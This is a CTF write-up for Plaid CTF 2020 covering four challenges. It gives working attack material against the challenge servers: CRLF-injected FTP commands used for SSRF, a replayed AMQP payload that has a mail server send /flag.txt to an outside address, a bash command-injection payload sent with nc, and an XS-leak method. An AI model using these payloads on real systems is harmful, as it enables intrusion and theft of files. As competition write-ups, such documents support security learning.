# Plaid CTF 2020

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200418-plaidctf2020/) of this writeup.**


 - [Plaid CTF 2020](#plaid-ctf-2020)
   - [Web](#web)
     - [Catelog (not solved)](#catelog-not-solved)
     - [Contrived Web Problem](#contrived-web-problem)
       - [The Weapon: SSRF](#the-weapon-ssrf)
       - [Identify the Target](#identify-the-target)
       - [Make SSRF Great Again with Active FTP](#make-ssrf-great-again-with-active-ftp)
       - [Craft the SSRF Payload](#craft-the-ssrf-payload)
     - [Mooz Chat (not solved)](#mooz-chat-not-solved)
   - [Misc](#misc)
     - [JSON Bourne](#json-bourne)


## Web

### Catelog (not solved)

> bookgin

Disclaimer: I didn't solve this challenge. I just want to put a few useful links here.

Problem Details:

```
[Here’s the site](http://catalog.pwni.ng/). The flag is on [this page](http://catalog.pwni.ng/issue.php?id=3).

Browser: Chromium with uBlock Origin 1.26.0 installed and in its default configuration

Flag format: /^PCTF\{[A-Z0-9_]+\}$/

Hints:
* To view your post, the admin will click on a link on the admin page.
* You might want to read up on User Activation.
* The intended solution does not require you to submit hundreds of captchas.

**Hint: Admin Bot Timeout**

The admin bot will always disconnect after about 30 seconds.
```

The challenge is about exploiting Chrome's [Scroll To Text Fragment](https://www.chromestatus.com/feature/4733392803332096) to leak data with lazy-loading images `<img loading="lazy">`. The uBlock Origin is intended to be used to duplicate the user activation to trigger multiple text fragment leakage. See [@lbherrera_'s partial solver ](https://twitter.com/lbherrera_/status/1251994130298875904) for more details.

The author [@thebluepichu](https://twitter.com/thebluepichu) (I think so?) said in the IRC channel:

Catalog has two injections: the image tag on the issue page and the username when you fail to login. Use the image tag one with a meta redirect to get offsite. Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again. Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3. So now we have arbitrary content with a user activation on the correct page, but still no code exec.

Ok, but what can we do? A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, though this consumes the user activation. If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll. It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the `<em>` tag gets split into a `<span>` for each individual letter on load! So you can do text searches of the form `#:~:text=F-,{,-X` for example to search for an X at the beginning of the flag. You can specify multiple text searches to do a binary search across the whole alphabet. Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha. Repeat 5 or 6 times to get the whole flag.


### Contrived Web Problem

> bookgin

This write-up is intended to be lengthy. The challenge itself is not that difficult, but I would like to share more about how I make progress and come out with next step.

This contrived challenge has 6 services in the dockerfile:

1. postgres: database backend
2. rabbit: rabbitmq server serves as an email queue
3. ftp: ftp server stores user's profile images
4. frontend server: the web server frontend; most are static files.
5. backend api: the web server backend handling most of the logic. The frontend server will proxy the route `/api` to this backend api server.
6. email: email server will fetch email task from rabbit.

The flag file `/flag.txt` are present in frontend server, email and backend api. This is very important because it's not much useful to exploit the server without flag.

#### The Weapon: SSRF

Because backend api handles the logic, We start from this service first. A quick look on the source we quickly identify a SSRF vulnerability:

```
/api/image?url=ftp://ftp:21/user/975b893d-7b0e-4091-8356-46b24fa43818/profile.png
```

The source code snippet:

```javascript=
        let parsed = new URL(url);

        let image: Buffer;
        if (parsed.protocol === "http:" || parsed.protocol === "https:") {
            const imageReq = await fetch(parsed.toString(), { method: "GET" }); 
            image = await (imageReq as any).buffer();
        } else if (parsed.protocol === "ftp:") {
            let username = decodeURIComponent(parsed.username);
            let password = decodeURIComponent(parsed.password);
            let filename = decodeURIComponent(parsed.pathname);
            let ftpClient = await connectFtp({
                host: parsed.hostname,
                port: parsed.port !== "" ? parseInt(parsed.port) : undefined,
                user: username !== "" ? username : undefined,
                password: password !== "" ? password : undefined,
            }); 
            image = await ftpClient.get(filename);
        } else {
            return res.status(500).send("Bad image url");
        } 

        if (!isPNG(image)) {
            return res.status(500).send("Bad image (not a png)");
        }

        res.type(".png").status(200).send(image);
```

Since those services are in LAN, the SSRF vulnerability is very useful. WE can simply use SSRF to smuggle protocol to any of the service.

However, the SSRF here is not that powerful. Regarding HTTP-based SSRF, the library is use `isomorphic-fetch`, which depends on `node-fetch`. We can't do much by simply controlling URL here, and we didn't find any CRLF in the library either. What's worse the HTTP method is limited in GET. Smuggling the payload in POST body is not possible. For GET, non-printable characters will be percent-encoded.

For FTP-based SSRF, the problem is FTP is a stateful protocol. Unlike HTTP protocol, in FTP the server has to greet the client first `200 OK\r\n` and then the client will proceed to send the username information `USER anonymous\r\n`.

In other words, even though we can control the destination host, unless the victim server sends something first, the TCP connection will just idle there. Both server and client are awaiting each other.

#### Identify the Target

Even with limited SSRF capability, let's identify possible targets. By default RabbitMQ has [multiple open ports](https://www.rabbitmq.com/networking.html).

1. postgres 5432: but we have no idea of the database name, username, password.
2. rabbit 4369: EPMD protocol. [a peer discovery service used by RabbitMQ nodes and CLI tools](https://www.rabbitmq.com/networking.html), but it doesn't seem to be useful
3. rabbit 5672: AMQP protocol. When the backend api adds a new email, it will communicate with this port. This could be exploitable.
4. rabbit 15672: HTTP management server for rabbitMQ. The HTTP API is using HTTP Basic Auth so it's very suitable for our SSRF target.
5. rabbit 25672: Erlang distribution server port. It seems like it's used by [internal CLI tools](https://www.rabbitmq.com/networking.html), and we don't think it's interesting.
6. ftp 21: The flag is not in FTP server. Even if we can retrieve files from FTP, it's not much useful.
7. frontend server: there is no reason to exploit the server from internal network. We can connect all API from WAN.
8. backend api: there is no reason to exploit the server from internal network. We can connect all API from `/api` via frontend server.
9. email: there is no listening port.

So the most promising target is rabbitmq, but let's recall the flag path again because not all servers have flag file. The flag file `/flag.txt` are present in frontend server, email and backend api. rabbitmq has no flag.

But don't forget rabbitmq servers as the email queue. If we can poison or inject some data into rabbitmq, we can make the email server send something out. Let's dive in the source code of email server first:

```javascript=
    let channel = await rabbit.createChannel();
    channel.consume("email", async (msg) => {
        if (msg === null) {
            return;
        } 
        channel.ack(msg);

        try {
            let data = JSON.parse(msg.content.toString());
            await transport.sendMail({
                from: "plaid2020problem@gmail.com",
                subject: "Your Account",
                ...data,
            }); 
        } catch (e) {
            console.error(e);
        } 
    })
```

The triple dot is called [Spread syntax](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax). Basically if we can inject the data into rabbitmq, we can control the object. In the [`transport.sendMail` document](https://nodemailer.com/message/), we can insert `attachments` and `to` to exfiltrate any file to our mail account in the email server.

Does it ring a bell? The email server contains the flag!

#### Make SSRF Great Again with Active FTP

The idea is clear now: use SSRF to poison the data `{to: "email@example.com", attachments:[{path:"/flag.txt"}]}`into rabbitmq, and just check the flag in the email.

However, either rabbitmq AMQP protocol or rabbitmq HTTP API requires pretty complicated payload to exploit. This is definitely not doable via HTTP-based SSRF.

The only hope, FTP-based SSRF, requires the remote server to send something first. Both AMQP and HTTP API won't greet the client first.

Which protocol greet the client? Of couse, the FTP server itself. Can we leverage ftp server to sharpen our SSRF?

FTP server has 2 modes, active and passive mode respectively. [This website](https://slacksite.com/other/ftp.html#actexample) explains them clearly with raw payload.

To sum up:

In active mode:
- Download (RETR): the client specifies IP and the server sends the file to it.
- Upload (STOR): the client specifies IP and the server retrieves the file from it.

In passive mode:
- Download (RETR): the server specifies IP and the client retrieves the file from it.
- Upload (STOR): the server specifies IP and the client sends the file to it.

Therefore only active download or passive upload can work here. For passive upload, because the vulnerable SSRF command for client is download (STOR), the client will not initial the connection to the IP.

But for active download, if we can make the FTP client specify the SSRF target and send RETR, the server will send the file to the target.

The [ftp-client](https://github.com/mscdex/node-ftp) is vulnerable to CRLF injections. We can easily craft a payload to trick the server to send `test.txt` to `127.0.0.1:1024`.

```
await ftp_client.get("foo\r\nbar\r\nPORT 127,0,0,1,4,0\r\nRETR test.txt\r\n");
```

When uploading file, the server will check whether the first a few bytes starts with PNG header. This can be easily bypassed via FTP active download. The following payload will track the server to download `255.255.255.255:1024` and save to `test.txt`. (It seems like some teams didn't bypass this but still managed to solve the challenge.)

```
await ftp_client.get("foo\r\nbar\r\nPORT 255,255,255,255,4,0\r\nSTOR text.txt\r\n");
```

Okay, we have a relatively powerful SSRF now. There is no need to smuggle any protocol. We can send any TCP content we want!

#### Craft the SSRF Payload

We have two options here:

1. rabbit 5672: AMQP protocol
2. rabbit 15672: HTTP management server for rabbitMQ.

We choose the first one. The AMQP protocol seems to be required interaction, but it can still work when I just record and replay all the payload together. For option 2 you can refer to other [write-ups in CTFTime](https://ctftime.org/task/11323).

We use wireshark to record the payload to rabbit port 5672.

```
00000000: 414d 5150 0000 0901 0100 0000 0001 3800  AMQP..........8.
00000010: 0a00 0b00 0001 1607 7072 6f64 7563 7453  ........productS
00000020: 0000 0007 616d 7170 6c69 6207 7665 7273  ....amqplib.vers
00000030: 696f 6e53 0000 0005 302e 352e 3508 706c  ionS....0.5.5.pl
00000040: 6174 666f 726d 5300 0000 104e 6f64 652e  atformS....Node.
00000050: 4a53 2076 3133 2e31 332e 300b 696e 666f  JS v13.13.0.info
00000060: 726d 6174 696f 6e53 0000 0023 6874 7470  rmationS...#http
00000070: 3a2f 2f73 7175 6172 656d 6f2e 6769 7468  ://squaremo.gith
00000080: 7562 2e69 6f2f 616d 7170 2e6e 6f64 650c  ub.io/amqp.node.
00000090: 6361 7061 6269 6c69 7469 6573 4600 0000  capabilitiesF...
000000a0: 8c12 7075 626c 6973 6865 725f 636f 6e66  ..publisher_conf
000000b0: 6972 6d73 7401 1a65 7863 6861 6e67 655f  irmst..exchange_
000000c0: 6578 6368 616e 6765 5f62 696e 6469 6e67  exchange_binding
000000d0: 7374 010a 6261 7369 632e 6e61 636b 7401  st..basic.nackt.
000000e0: 1663 6f6e 7375 6d65 725f 6361 6e63 656c  .consumer_cancel
000000f0: 5f6e 6f74 6966 7974 0112 636f 6e6e 6563  _notifyt..connec
00000100: 7469 6f6e 2e62 6c6f 636b 6564 7401 1c61  tion.blockedt..a
00000110: 7574 6865 6e74 6963 6174 696f 6e5f 6661  uthentication_fa
00000120: 696c 7572 655f 636c 6f73 6574 0105 504c  ilure_closet..PL
00000130: 4149 4e00 0000 0a00 7465 7374 0074 6573  AIN.....test.tes
00000140: 7405 656e 5f55 53ce 0100 0000 0000 0c00  t.en_US.........
00000150: 0a00 1f07 ff00 0010 0000 3cce 0100 0000  ..........<.....
00000160: 0000 0800 0a00 2801 2f00 00ce 0100 0100  ......(./.......
00000170: 0000 0500 1400 0a00 ce01 0001 0000 000e  ................
00000180: 003c 0028 0000 0005 656d 6169 6c00 ce02  .<.(....email...
00000190: 0001 0000 0012 003c 0000 0000 0000 0000  .......<........
000001a0: 0051 2000 0000 0000 ce03 0001 0000 0051  .Q ............Q
000001b0: 7b22 746f 223a 2262 616c 736e 6374 6640  {"to":"balsnctf@
000001c0: 6578 616d 706c 652e 636f 6d22 2c22 7465  example.com","te
000001d0: 7874 223a 2250 574e 4544 222c 2261 7474  xt":"PWNED","att
000001e0: 6163 686d 656e 7473 223a 5b7b 2270 6174  achments":[{"pat
000001f0: 6822 3a22 2f66 6c61 672e 7478 7422 7d5d  h":"/flag.txt"}]
00000200: 7dce                                     }.
```

Replay the payload will insert `{"to":"balsnctf@example.com","text":"PWNED","attachments":[{"path":"/flag.txt"}]}` into rabbitmq. It has a low probability to fail to insert a new record.

Here is the script:

```python
#!/usr/bin/env python3
import requests, secrets, base64, re
from urllib.parse import quote

s = requests.session()

u = 'http://contrived.pwni.ng/api/'
try:
    r = s.get(u+'image', params=dict(url="ftp://ftp:21/"+quote("foo\r\nbar\r\nPORT 255,255,255,255,4,0\r\nSTOR /http.txt\r\n")), timeout=5)
except Exception as e:
    print(e)
try:
    r = s.get(u+'image', params=dict(url="ftp://ftp:21/"+quote("foo\r\nbar\r\nPORT 172,32,56,72,22,40\r\nRETR /http.txt\r\n")), timeout=5)
except Exception as e:
    print(e)
```

Check the email and profit!

![](https://i.imgur.com/DdMa59A.png)


`PCTF{not_that_contrived_i_guess}`

By the way, I spent 2+ hours on debugging only to find out I type the incorrect internel IP address......

### Mooz Chat (not solved)

See [@pastenctf](https://twitter.com/pastenctf)'s writeup [here](https://github.com/koolkdev/ctf-writeups/tree/master/plaid2020/mooz-chat). Part 1 is about Go reversing + command injection. Part 2 is WebRTC + MitM  Diffie-Hellman.

## Misc

### JSON Bourne

This is a Bash command injection challenge. Quickly browse the code and find this interesting:

```bash
    for (( task_i=0; task_i < ${#result_str}; task_i++ )); do
        if [[ "${result_str:$task_i:5}" = "task " ]]; then
            local suffix="${result_str:$((task_i+5)):$((${#result_str}-task_i-5))}"
            if [[ "$((suffix > 0))" = "1" && "$((suffix <= 8))" = "1" ]]; then
                local color=$var_name
                normalizeNumber "$suffix" $color "var_"
                eval ${res}'[_color]=${color}'
            fi
        fi
    done
```

So if we have string prefixed with `task`, the `$suffix` will become the word after it.

Example:

```
{"task abc":""}

$suffix = "abc"

if [[ ""$(("abc" > 0))"" ...
```

This is the most promising injection point, but even the [Indirect Variable References](https://www.tldp.org/LDP/abs/html/ivr.html#IVRREF) is not able to achieve command injection here. With this syntax we can retrieve environment variable at most.

```
{"task PATH":""}

./parser.sh: line 21: /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl: syntax error: operand expected (error token is "/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl")
```

The `$((suffix > 0 ))`is instriguing. Then I write a simple fuzzer to try to solve it:

```python
#!/usr/bin/env python3
import subprocess
from itertools import product
seed = [
    '"',
    'yes',
    '`yes`',
    '(',
    '$',
    '[',
    ']',
    ')',
    '',
    ':',
    ' ',
    "'",
    "0",
    "1",
    '='
]
for p in product(seed, seed, seed, seed):
    p = ''.join(p)
    if 'yes' not in p:
        continue
    p = '{' + f'"task 1":"task _var_name_{p}","`yes`":"task var_15=13"' + '}'
    print(repr(p))
    s = subprocess.run(['./pprint.sh'], input=p.encode(), capture_output=True)
    print(s)

'''
echo '{"task 1":"task _var_name_yes[`cat$IFS*`]","`cat$IFS*`":"task var_15=13"}' | nc json.bourne.pwni.ng 1337 | grep PCTF
./parser.sh: line 20: PCTF{the_bourne_identity_crisis}
'''
```

The payload is simply using `[]` to perform injection. It seems like `[]` will get interpret again.

```json
{"task foo[`cat *`]":""}
```

You can also use double reference to solve this. Refer to [mhackeroni team's write-up in CTFTime](https://ctftime.org/writeup/20099).

Heuristic-based fuzzing is pretty useful, isn'it :)?

